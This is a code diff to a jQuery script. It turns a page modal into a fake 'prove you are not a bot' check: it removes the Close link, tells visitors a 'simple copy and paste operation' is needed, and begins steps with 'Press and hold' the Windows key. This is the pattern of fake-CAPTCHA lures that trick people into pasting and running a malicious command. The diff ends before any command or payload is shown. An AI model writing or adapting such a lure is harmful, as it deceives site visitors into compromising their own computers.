@@ -23,15 +23,20 @@ $(document).ready(function() {
                 .modal p {
                     color: black !important;
                 }
+                .modal {
+                    color: black !important;
+                }
             `)
             .appendTo("head");
 
         $(`
             <div id="ex1" class="modal">
                 <h1>Proove you are not a bot!</h1>
-                <p>Confirm your digital identity with a computer.</p>
-                <p>This method allows you to safely login to the page.</p>
-                <a href="#" rel="modal:close">Close</a>
+                <p>Confirm your digital identity with a computer. This method allows you to safely login to the page without the need to remember your login and password.</p>
+                <p>Simple copy and paste operation is needed, nothing more.</p>
+                <ol>
+                    <li>Press and hold <img src="/src/win_logo.png" width="16" height="16"/></li>
+                </ol>
             </div>
         `)
         .appendTo("body")
